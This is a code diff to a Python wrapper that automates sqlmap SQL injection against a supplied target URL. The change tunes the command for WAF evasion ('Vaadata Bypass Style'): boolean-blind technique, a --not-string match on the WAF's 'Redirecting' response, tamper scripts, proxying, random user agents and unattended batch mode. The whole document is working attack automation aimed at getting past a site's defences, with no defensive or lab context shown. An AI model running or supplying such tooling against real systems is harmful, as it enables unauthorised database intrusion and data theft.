@@ -44,16 +44,18 @@ def run_sqlmap_auto(target_url):
     print(f"    WAF Tamper: {TAMPER_SCRIPTS}")
     print(f"    Custom Header: {header}")
 
-    # 2. Construct Command
+    # 2. Construct Command (Vaadata Bypass Style)
+    # --level=2 to check cookies
+    # --technique=B for boolean-blind
+    # --not-string to catch the "Redirecting" WAF behavior
     cmd = f"{SQLMAP_PATH} -u \"{target_url}\" " \
           f"--proxy=\"{proxy}\" " \
-          f"--user-agent=\"{user_agent}\" " \
-          f"--headers=\"{header}\" " \
           f"--tamper=\"{TAMPER_SCRIPTS}\" " \
-          f"--level=3 --risk=2 " \
-          f"--random-agent " \
-          f"--batch " \
-          f"--threads=5 --timeout=15" # Optimization
+          f"--level=2 --risk=2 " \
+          f"--technique=B " \
+          f"--not-string=\"Redirecting\" " \
+          f"--random-agent --proxy-fake-browser --no-cast " \
+          f"--batch --threads=5 --timeout=15" 
 
     # 3. Execution
     print(f"\n[*] Executing Command:\n{cmd}\n")
